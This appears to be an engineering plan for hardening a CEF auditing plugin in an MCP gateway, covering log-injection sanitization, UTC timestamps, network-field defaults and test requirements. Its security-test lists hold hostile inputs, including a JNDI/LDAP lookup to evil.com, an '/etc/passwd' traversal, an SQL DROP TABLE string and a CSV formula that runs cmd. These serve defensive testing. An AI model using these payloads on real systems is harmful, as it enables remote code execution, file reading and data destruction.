# CEF Auditing Plugin Bug Fixes and Improvements

## Overview
This document outlines critical bugs and improvements needed for the Common Event Format (CEF) auditing plugin. These issues affect security, reliability, and compliance with industry standards.

## Priority 1: Critical Runtime Issues

### 1.1 Guard Metadata Access
**Problem**: Unguarded access to `decision.metadata` can cause AttributeError if metadata is None.

**Current Code**:
```python
# In tools/list filtering check:
if (request.method == "tools/list" and 
    decision.metadata.get("filtered_count", 0) > 0):  # Can fail if metadata is None

# In duration tracking:
if decision.metadata and "duration_ms" in decision.metadata:
    event_data["duration_ms"] = decision.metadata["duration_ms"]
```

**Solution**:
```python
# Guard all metadata accesses
if (request.method == "tools/list" and 
    decision.metadata and decision.metadata.get("filtered_count", 0) > 0):
    event_type = "TOOLS_FILTERED"
```

### 1.2 Fix _extract_plugin_info in Base Class
**Problem**: The `_extract_plugin_info` method (inherited from BaseAuditingPlugin) may not handle all edge cases properly.

**Action Required**:
- Review base class implementation
- Ensure it handles None values, missing attributes
- Add fallback for when plugin info extraction fails
- Consider adding try/except wrapper

## Priority 2: Security Vulnerabilities

### 2.1 Escape/Sanitize ALL User-Controlled Strings
**Problem**: User-controlled strings could contain malicious content for log injection attacks.

**Affected Fields (ALL must be sanitized)**:
- `decision.reason` - decision text
- `request.params["name"]` - tool name  
- `request.method` - MCP method
- `server_name` - server identifier
- `plugin` info - plugin name
- `args`/message bodies - payload data
- Any field from `event_data`

**Solution with Configurable Per-Field Limits**:
```python
def __init__(self, config):
    super().__init__(config)
    # Store config for later use
    self.config = config
    
    # Get CEF-specific configuration
    cef_config = config.get('cef_config', {})
    
    # Configurable per-field length limits (under cef_config)
    self.field_max_lengths = cef_config.get('field_max_lengths', {
        'reason': 2000,
        'tool': 256,
        'method': 256,
        'plugin': 256,
        'server_name': 256,
        'args': 10000,
        'message': 10000,
        'default': 1000
    })
    
    # Store truncation indicator (under cef_config)
    self.truncation_indicator = cef_config.get('truncation_indicator', '...[truncated]')

def _sanitize_for_log(self, value: str, field_name: str = 'default') -> str:
    """Centralized sanitization - apply BEFORE CEF escaping.
    
    - Remove control characters
    - Apply configurable per-field length limits
    - Prevent log injection
    - Avoid double-escaping by sanitizing first
    """
    if value is None:
        return ""
    
    value = str(value)  # Ensure string type
    
    # Remove control characters except tab/newline
    sanitized = ''.join(char for char in value 
                       if char.isprintable() or char in '\t\n')
    
    # Replace newlines with escaped version
    sanitized = sanitized.replace('\n', '\\n').replace('\r', '\\r')
    
    # Apply field-specific length limit from config
    max_length = self.field_max_lengths.get(field_name, 
                                           self.field_max_lengths['default'])
    
    if len(sanitized) > max_length:
        # Use stored truncation_indicator from __init__
        sanitized = sanitized[:max_length-len(self.truncation_indicator)] + self.truncation_indicator
    
    return sanitized

# Order of operations example:
def _format_request_log(...):
    # Step 1: Sanitize ALL user-controlled fields FIRST
    # NOTE: Sanitization adds backslashes (\n becomes \\n) which will be 
    # escaped again by CEF (\\n becomes \\\\n). This is INTENDED behavior
    # to ensure the literal string "\n" appears in logs, not a newline.
    sanitized_reason = self._sanitize_for_log(decision.reason, 'reason')
    sanitized_method = self._sanitize_for_log(request.method, 'method')
    sanitized_tool = self._sanitize_for_log(request.params.get('name'), 'tool') if request.params else None
    sanitized_server = self._sanitize_for_log(server_name, 'server_name')
    sanitized_plugin = self._sanitize_for_log(self._extract_plugin_info(decision), 'plugin')
    
    # Step 2: Build event_data with sanitized values
    event_data = {
        'reason': sanitized_reason,
        'method': sanitized_method,
        'tool': sanitized_tool,
        'server_name': sanitized_server,
        'plugin': sanitized_plugin,
        'status': 'ALLOWED' if decision.allowed else 'BLOCKED',  # Will be normalized
        # etc...
    }
    
    # Step 3: Apply CEF escaping only in _format_cef_message
    # This intentionally double-escapes the backslashes from sanitization
    return self._format_cef_message(event_data)

# APPLY SAME PATTERN in _format_response_log and _format_notification_log!
# All user fields must be sanitized before CEF escaping
```

### 2.2 CSV Injection Mitigation
**Problem**: When other plugins output CSV format, malicious formulas could be injected.

**Note**: This applies to CSV plugin, not CEF directly, but should be coordinated.

## Priority 3: Standards Compliance

### 3.1 Fix Syslog RFC 5424 Timestamp & UTC Normalization
**Problem**: The CEF timestamp format doesn't comply with RFC 5424 for syslog integration, and timezone handling is inconsistent.

**Current Implementation in _convert_to_cef_timestamp**:
```python
return dt.strftime("%b %d %Y %H:%M:%S")  # "Jan 15 2024 10:30:45"
```

**Comprehensive Solution**:
```python
def _convert_to_cef_timestamp(self, timestamp: str) -> str:
    """Convert ISO timestamp to CEF format with UTC normalization.
    
    Args:
        timestamp: ISO timestamp string (any timezone)
        
    Returns:
        str: CEF timestamp in UTC (MMM dd yyyy HH:mm:ss)
    """
    try:
        from datetime import datetime, timezone
        
        # Parse ISO timestamp with timezone awareness
        if timestamp.endswith('Z'):
            dt = datetime.fromisoformat(timestamp[:-1]).replace(tzinfo=timezone.utc)
        elif '+' in timestamp or timestamp.count('-') > 2:
            # Has timezone offset
            dt = datetime.fromisoformat(timestamp)
        else:
            # No timezone, assume UTC
            dt = datetime.fromisoformat(timestamp).replace(tzinfo=timezone.utc)
        
        # Normalize to UTC
        dt_utc = dt.astimezone(timezone.utc)
        
        # Format for CEF (human-readable UTC)
        # Document: All CEF timestamps are normalized to UTC
        return dt_utc.strftime("%b %d %Y %H:%M:%S")
        
    except Exception as e:
        # Log warning about timestamp parse failure
        self.logger.warning(f"Failed to parse timestamp {timestamp}: {e}")
        return timestamp  # Return original on failure
```

**For Syslog Transport (wrapper layer)**:
```python
# RFC 5424: 2024-01-15T10:30:45.123Z
def format_syslog_timestamp(dt: datetime) -> str:
    """Format timestamp for RFC 5424 syslog transport."""
    # Ensure UTC
    dt_utc = dt.astimezone(timezone.utc)
    # RFC 5424 format with milliseconds
    return dt_utc.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
```

**Documentation Note**: All CEF timestamps are normalized to UTC before formatting. The human-readable CEF format uses UTC time consistently.

### 3.2 Avoid Misleading Network Field Defaults
**Problem**: Current code defaults src/dst to 127.0.0.1 when unknown, polluting analytics.

**Current Code Issue**:
```python
# Network fields - use event data if available, otherwise default to localhost
source_ip = event_data.get('source_ip', '127.0.0.1')
destination_ip = event_data.get('destination_ip', '127.0.0.1')
```

**Solution**: Either omit fields or use explicit "N/A":
```python
# Option 1: Only include if actually known
source_ip = event_data.get('source_ip')
destination_ip = event_data.get('destination_ip')

if source_ip is not None:
    extensions.append(f"src={self._escape_cef_extension(str(source_ip))}")
if destination_ip is not None:
    extensions.append(f"dst={self._escape_cef_extension(str(destination_ip))}")

# Option 2: Use explicit N/A
if source_ip is None:
    source_ip = 'N/A'
if destination_ip is None:
    destination_ip = 'N/A'
extensions.append(f"src={self._escape_cef_extension(source_ip)}")
extensions.append(f"dst={self._escape_cef_extension(destination_ip)}")
```

**Recommendation**: Use Option 1 (omit when unknown) to avoid polluting SIEM analytics with meaningless localhost addresses.

### 3.3 Prevent Pretty-Print Multi-line in JSON Lines Mode
**Problem**: If pretty_print is enabled but format claims to be JSON Lines, output will be invalid.

**Solution (Base Class)**:
- Enforce single-line mode when JSON Lines is selected
- Add validation in base class `__init__`:
```python
if self.output_format == 'jsonl' and self.pretty_print:
    raise ValueError("JSON Lines format requires pretty_print=False")
```
- Document incompatibility clearly in configuration schema

## Priority 4: Consistency Issues

### 4.1 Standardize Event Type/Status Vocabulary
**Problem**: Inconsistent event types and status values across different plugins.

**Current Issues**:
- Redundant `REQUEST_BLOCKED` vs `SECURITY_BLOCK`
- Inconsistent status casing
- No clear mapping between standard vocabulary and CEF specifics

**Updated CEF Mappings (Remove Redundancy)**:
```python
# Consolidated CEF mappings - REQUEST_BLOCKED DEPRECATED
CEF_EVENT_MAPPINGS = {
    'REQUEST': {'event_id': '100', 'severity': 6, 'name': 'MCP Request'},
    'RESPONSE': {'event_id': '101', 'severity': 6, 'name': 'MCP Response'},
    'SECURITY_BLOCK': {'event_id': '200', 'severity': 8, 'name': 'Security Block'},
    # REQUEST_BLOCKED: DEPRECATED - use SECURITY_BLOCK
    'REDACTION': {'event_id': '201', 'severity': 7, 'name': 'Content Redaction'},
    'MODIFICATION': {'event_id': '203', 'severity': 7, 'name': 'Content Modification'},
    'ERROR': {'event_id': '400', 'severity': 9, 'name': 'System Error'},
    'UPSTREAM_ERROR': {'event_id': '401', 'severity': 8, 'name': 'Upstream Error'},
    'TOOLS_FILTERED': {'event_id': '202', 'severity': 7, 'name': 'Tools Filtered'},
    'NOTIFICATION': {'event_id': '102', 'severity': 4, 'name': 'MCP Notification'},
}

# In request blocking logic - use SECURITY_BLOCK only
if not decision.allowed:
    event_type = "SECURITY_BLOCK"  # Use for ALL blocks, not REQUEST_BLOCKED
```

**Proposed Standard Vocabulary**:
```python
# Event Types (what happened)
EVENT_TYPES = [
    'request',
    'response', 
    'notification',
    'error'
]

# Event Actions (what was done)
EVENT_ACTIONS = [
    'allowed',
    'blocked',
    'modified',
    'redacted',
    'filtered'
]

# Event Sources (who did it)
EVENT_SOURCES = [
    'security_plugin',
    'audit_plugin',
    'upstream_server',
    'watchgate_core'
]
```

### 4.2 Add Modification Detection Parity for Requests
**Problem**: Response modifications are detected, but request modifications aren't consistently detected.

**Comprehensive Solution**:
```python
# In _format_request_log, at modification detection:
if decision.modified_content is not None:
    # ANY modified_content means modification occurred
    event_type = "MODIFICATION"  # Default to modification
    
    if isinstance(decision.modified_content, MCPRequest):
        # Can diff MCPRequest attributes
        modification_types = []
        
        if hasattr(request, 'params') and hasattr(decision.modified_content, 'params'):
            if request.params != decision.modified_content.params:
                modification_types.append('params')
        
        if modification_types:
            event_data["modification_type"] = ','.join(modification_types)
        else:
            # Modified but can't determine what changed
            event_data["modification_type"] = "content_modified"
    else:
        # Can't diff non-MCPRequest, check reason for hints
        if decision.reason and 'redact' in decision.reason.lower():
            event_type = "REDACTION"  # Only override if reason suggests redaction
        event_data["modification_type"] = "content_modified"

# Don't rely on reason containing "redact" as primary detection
# modified_content is the authoritative indicator
```

### 4.3 Lean Mode to Reduce Message Size
**Enhancement**: Optional mode to reduce duplication between standard and custom fields.

```python
class CefAuditingPlugin:
    def __init__(self, config):
        cef_config = config.get('cef_config', {})
        self.lean_mode = cef_config.get('lean_mode', False)  # Read from cef_config
    
    def _format_cef_message(self, event_data):
        # ... build extensions ...
        
        if 'plugin' in event_data:
            # Always include custom field
            extensions.append(f"cs1={self._escape_cef_extension(event_data['plugin'])}")
            extensions.append("cs1Label=Plugin")
            
            # Only duplicate to standard field if not in lean mode
            if not self.lean_mode:
                extensions.append(f"sourceUserName={self._escape_cef_extension(event_data['plugin'])}")
        
        # Apply same pattern for method, tool, duration, server_name
        # This can reduce message size by ~30% when many fields are present
```

## Optional Enhancements

### 5.1 Auto-generate Trace/Span IDs
**Enhancement**: Add OpenTelemetry trace/span IDs when not provided.
```python
import uuid

if not event_data.get('trace_id'):
    event_data['trace_id'] = str(uuid.uuid4())
if not event_data.get('span_id'):
    event_data['span_id'] = str(uuid.uuid4())[:16]
```

### 5.2 Size Control for Large Fields
**Enhancement**: Implement configurable truncation with privacy options.
```python
class CefAuditingPlugin:
    def __init__(self, config):
        super().__init__(config)
        cef_config = config.get('cef_config', {})
        # Size control configuration (consistent path under cef_config)
        self.field_max_lengths = cef_config.get('field_max_lengths', {
            'args': 10000,
            'message': 10000,
            'default': 1000
        })
        self.truncation_indicator = cef_config.get('truncation_indicator', '...[truncated]')
        
        # Privacy options (read from cef_config)
        self.drop_args = cef_config.get('drop_args', False)  # Completely omit args
        self.hash_large_fields = cef_config.get('hash_large_fields', False)  # Include SHA256 instead
        
    def _handle_large_field(self, value: str, field_name: str) -> str:
        """Handle large fields with truncation or hashing."""
        if self.drop_args and field_name == 'args':
            return "[OMITTED]"
        
        max_len = self.field_max_lengths.get(field_name, 
                                            self.field_max_lengths['default'])
        
        if len(value) > max_len:
            if self.hash_large_fields:
                import hashlib
                hash_val = hashlib.sha256(value.encode()).hexdigest()[:16]
                return f"[SHA256:{hash_val}...{self.truncation_indicator}]"
            else:
                return value[:max_len-len(self.truncation_indicator)] + self.truncation_indicator
        
        return value
```

### 5.3 Schema Version Field
**Enhancement**: Add version field for schema evolution.
```python
CEF_SCHEMA_VERSION = "1.0.0"
extensions.append(f"schemaVersion={self._escape_cef_extension(CEF_SCHEMA_VERSION)}")
```

### 5.4 Redaction Hooks & Base Class Utilities
**Enhancement**: Provide common utilities in base class for all plugins.

**Base Class Enhancements**:
```python
class BaseAuditingPlugin:
    def _sanitize_for_log(self, value: str, field_name: str = 'default') -> str:
        """Common sanitization utility for all plugins."""
        # Implementation as above
        pass
    
    def _enforce_json_lines_mode(self):
        """Enforce single-line output for JSON Lines."""
        if self.output_format == 'jsonl' and self.pretty_print:
            raise ValueError("JSON Lines format is incompatible with pretty_print=True")
    
    async def redact_sensitive_data(self, event_data: Dict) -> Dict:
        """Hook for custom redaction logic."""
        # Can be overridden by subclasses
        return event_data
    
    def _extract_plugin_info(self, decision: PolicyDecision) -> str:
        """Robustly extract plugin information."""
        try:
            if decision is None:
                return "unknown"
            
            if hasattr(decision, 'plugin_name') and decision.plugin_name:
                return str(decision.plugin_name)
            
            if hasattr(decision, 'metadata') and decision.metadata:
                if isinstance(decision.metadata, dict):
                    return decision.metadata.get('plugin', 'unknown')
            
            return "unknown"
        except Exception as e:
            self.logger.warning(f"Failed to extract plugin info: {e}")
            return "unknown"
```

### 5.5 Close Handlers on Shutdown
**Enhancement**: Properly close logging handlers and flush buffers.
```python
async def shutdown(self):
    """Clean shutdown of plugin resources."""
    # Close all logging handlers properly
    if hasattr(self, 'logger') and self.logger.handlers:
        for handler in self.logger.handlers:
            try:
                handler.flush()
                handler.close()
            except Exception as e:
                # Log but don't fail shutdown
                print(f"Warning: Failed to close handler {handler}: {e}")
    
    # If plugin maintains its own file handle (rare)
    if hasattr(self, '_file_handle') and self._file_handle:
        try:
            self._file_handle.flush()
            self._file_handle.close()
        except Exception:
            pass  # Best effort
```

### 5.6 Double Truncation Considerations
**Important**: Be aware of interaction between per-field limits and base class truncation.

```python
class BaseAuditingPlugin:
    def _safe_log(self, message: str) -> str:
        """Base class truncates AFTER formatting"""
        if len(message) > self.max_message_length:
            return message[:self.max_message_length] + '...[truncated]'
        return message

class CefAuditingPlugin:
    def __init__(self, config):
        super().__init__(config)
        cef_config = config.get('cef_config', {})
        
        # IMPORTANT: Set high enough to avoid double truncation
        # CEF already truncates individual fields, so set base limit high
        self.max_message_length = cef_config.get('max_message_length', 50000)  # Much higher than default
        
        # Per-field limits (applied BEFORE CEF formatting)
        self.field_max_lengths = cef_config.get('field_max_lengths', {
            'reason': 2000,
            'args': 10000,
            # etc...
        })
```

**Truncation Order**:
1. First: Per-field truncation via `_sanitize_for_log()` (e.g., reason at 2000 chars)
2. Then: CEF formatting builds the complete message
3. Finally: Base class `_safe_log()` truncates entire message if > max_message_length

**Recommendation**: Set `max_message_length` high (50000+) for CEF to avoid truncating already-formatted messages. Document this in configuration.

### 5.7 Device Field Configuration
**Enhancement**: Don't hardcode device fields - use configuration or system values.
```python
class CefAuditingPlugin:
    def __init__(self, config):
        cef_config = config.get('cef_config', {})
        # Optional device identification
        self.device_hostname = cef_config.get('device_hostname')
        self.device_ip = cef_config.get('device_ip')
    
    def _format_cef_message(self, event_data):
        # Add device fields only if known (ALWAYS sanitize first!)
        if self.device_hostname:
            # Sanitize THEN escape - double protection
            sanitized_hostname = self._sanitize_for_log(self.device_hostname, 'device_hostname')
            extensions.append(f"dvchost={self._escape_cef_extension(sanitized_hostname)}")
        # Option: Get from system
        # import socket
        # hostname = socket.gethostname()
        # sanitized_hostname = self._sanitize_for_log(hostname, 'device_hostname')
        # extensions.append(f"dvchost={self._escape_cef_extension(sanitized_hostname)}")
        
        if self.device_ip:
            # Sanitize THEN escape - double protection
            sanitized_ip = self._sanitize_for_log(self.device_ip, 'device_ip')
            extensions.append(f"dvc={self._escape_cef_extension(sanitized_ip)}")
        # NEVER default to 127.0.0.1 - omit if unknown
```

## Implementation Plan

### Phase 1: Critical Fixes (Immediate)
1. Guard all metadata accesses
2. Fix base class _extract_plugin_info
3. Add string sanitization for user inputs

### Phase 2: Security Hardening (High Priority)
1. Implement comprehensive input sanitization
2. Add log injection prevention
3. Coordinate CSV injection fixes

### Phase 3: Standards Compliance (Medium Priority)
1. Fix timestamp formats
2. Resolve JSON Lines vs pretty-print conflict
3. Standardize vocabulary across plugins

### Phase 4: Enhancements (Low Priority)
1. Add OTEL trace/span support
2. Implement truncation policies
3. Add schema versioning
4. Create redaction hooks
5. Implement proper shutdown handlers

## Testing Requirements

### Unit Tests
- **Metadata None paths**: Test all decision.metadata accesses with None
- **Sanitization**: 
  - Control characters (\x00-\x1F)
  - Newlines and carriage returns
  - CSV meta-characters (commas, quotes)
  - CEF meta-characters (pipes, equals, backslashes)
  - Long strings exceeding limits
- **Timestamp UTC normalization**: Various timezone inputs
- **Request modification detection**: Non-MCPRequest types
- **Field length truncation**: All field types with limits
- **Network fields**: Omission when unknown vs N/A

### Integration Tests
- **Syslog RFC 5424 end-to-end**: Full transport validation
- **SIEM Parser Validation**:
  - ArcSight CEF parser
  - Splunk CEF app
  - QRadar DSM
- **Large payload behavior**: 100MB+ payloads
- **Concurrent request handling**: Race conditions

### Security Tests
- **Log injection strings across ALL plugins**:
  ```python
  INJECTION_TESTS = [
      "\n\rFake-Header: injected",
      "||CEF:0|FakeVendor|FakeProduct|1.0|100|Injected|10|",
      "${jndi:ldap://evil.com/a}",
      "../../etc/passwd",
      "'; DROP TABLE logs; --"
  ]
  ```
- **CSV injection for CSV plugin**:
  ```python
  CSV_INJECTION = [
      "=cmd|'/c calc.exe'",
      "@SUM(A1:A10)",
      "+1234567890",
      "-1234567890"
  ]
  ```
- **Resource exhaustion**: Memory/CPU limits with large fields

## Final Implementation Notes

### ✅ Critical Implementation Checklist

1. **Sanitize ALL user fields BEFORE escaping**: 
   - Fields: reason, method, tool, plugin, server_name, args/msg
   - Apply _sanitize_for_log() first, then _escape_cef_extension()
   - Config: identifiers 256, reason 2k, args/msg configurable (10k default)
   - **NOTE**: Sanitization intentionally adds backslashes (\n → \\n) which CEF will escape again (\\n → \\\\n) to preserve literal "\n" in logs

2. **Request modification detection**:
   ```python
   if decision.modified_content is not None:
       event_type = "MODIFICATION"  # ALWAYS set for any modified_content
   ```

3. **Timestamp: CEF format with UTC normalization**:
   - Keep CEF's `MMM dd yyyy HH:mm:ss` format
   - Parse ANY timezone input → normalize to UTC → format as CEF
   - RFC 5424 ONLY for syslog transport wrapper (not CEF itself)

4. **Network fields: NO misleading defaults**:
   ```python
   # Only add if known - NO 127.0.0.1 defaults!
   if source_ip is not None:
       extensions.append(f"src={self._escape_cef_extension(str(source_ip))}")
   ```

5. **Vocabulary: DEPRECATE REQUEST_BLOCKED**:
   ```python
   if not decision.allowed:
       event_type = "SECURITY_BLOCK"  # Use for ALL blocks
   ```

7. **Config consistency**: ALL settings read from `cef_config`, not config root

8. **No hardcoded line numbers**: Use context descriptions instead

9. **Universal sanitization**: Apply in request, response, AND notification methods

6. **Metadata guards**:
   ```python
   if (request.method == "tools/list" and 
       decision.metadata and  # Guard added!
       decision.metadata.get("filtered_count", 0) > 0):
   ```

### 🔴 Common Mistakes to Avoid

❌ **DON'T**: Sanitize and escape in same step (causes double-escaping)
✅ **DO**: Sanitize first, then escape

❌ **DON'T**: Use decision.reason to detect modifications
✅ **DO**: Use decision.modified_content as authoritative

❌ **DON'T**: Output mixed timezones
✅ **DO**: Always normalize to UTC

❌ **DON'T**: Default network fields to localhost
✅ **DO**: Omit when unknown

### Configuration Example
```yaml
cef_config:
  device_vendor: "Watchgate"
  device_product: "MCP Gateway"
  lean_mode: true  # Reduce message size
  field_max_lengths:
    reason: 2000
    tool: 256
    method: 256
    plugin: 256
    server_name: 256
    args: 10000
    message: 10000
  truncation_indicator: "...[truncated]"
  max_message_length: 50000  # Set HIGH to avoid double truncation after CEF formatting
```

## Final Implementation Reminders

### Critical Config Path Consistency
**ALL CEF-specific settings must be under `cef_config` key:**
```python
def __init__(self, config):
    cef_config = config.get('cef_config', {})  # Get CEF section
    
    # ALL these read from cef_config, NOT config root:
    self.field_max_lengths = cef_config.get('field_max_lengths', {...})
    self.truncation_indicator = cef_config.get('truncation_indicator', '...')
    self.lean_mode = cef_config.get('lean_mode', False)
    self.drop_args = cef_config.get('drop_args', False)
    self.hash_large_fields = cef_config.get('hash_large_fields', False)
    self.device_vendor = cef_config.get('device_vendor', 'Watchgate')
    self.device_hostname = cef_config.get('device_hostname')  # Optional
    self.device_ip = cef_config.get('device_ip')  # Optional
```

### QC-Approved Polish Points
1. **Status Normalization**: Always normalize status to lowercase before writing CEF act field
2. **Universal Sanitization**: Apply sanitization in ALL three log methods (request, response, notification)
3. **Logger Availability**: Check `hasattr(self, 'logger') and self.logger` before logging warnings
4. **Double-Escaping Test**: Include test verifying literal "\n" appears after sanitize+CEF escape
5. **Custom Extensions**: Document that schemaVersion is a custom CEF extension (acceptable practice)

### Status Normalization Example
```python
# In _format_cef_message method:
status = event_data.get('status', '')
if status:
    # Always normalize to lowercase for consistency
    normalized_status = status.lower()
    if normalized_status in ['allowed', 'blocked', 'success', 'error', 'modified']:
        extensions.append(f"act={self._escape_cef_extension(normalized_status)}")
```

## Critical Implementation Requirements Summary

### Sanitize-Then-Escape Pattern (ALL methods)
1. **_format_request_log**: Sanitize all fields → Build event_data → CEF escape
2. **_format_response_log**: Sanitize all fields → Build event_data → CEF escape  
3. **_format_notification_log**: Sanitize all fields → Build event_data → CEF escape
4. **Device fields**: Sanitize hostname/IP if populated before CEF escaping
5. **Network fields**: Sanitize source/dest IPs before CEF escaping

### Network Field Consistency
- If omitting `src`, also omit `spt` (source port) and related fields
- If omitting `dst`, also omit `dpt` (destination port) and related fields
- Never add partial network data - all or nothing

### Vocabulary Alignment Across Plugins
```python
# Use StandardVocabulary in ALL auditing plugins:
# - CEF plugin
# - CSV plugin  
# - JSON plugin
# - Syslog plugin
# Each plugin maps standard vocab to its specific format
```

## Notes

- CEF format is widely used in enterprise SIEM systems (ArcSight, Splunk, QRadar)
- Maintaining strict CEF compliance is critical for enterprise adoption
- All timestamps normalized to UTC for consistency
- Network fields omitted when unknown to avoid analytics pollution
- Lean mode available for bandwidth-constrained environments
- Base class provides common utilities for all plugins
- Custom CEF extensions (like schemaVersion) are acceptable and won't break parsers
- StandardVocabulary ensures consistency across all auditing plugins
- Consider creating a CEF validation tool for testing
- Document all deviations from CEF standard clearly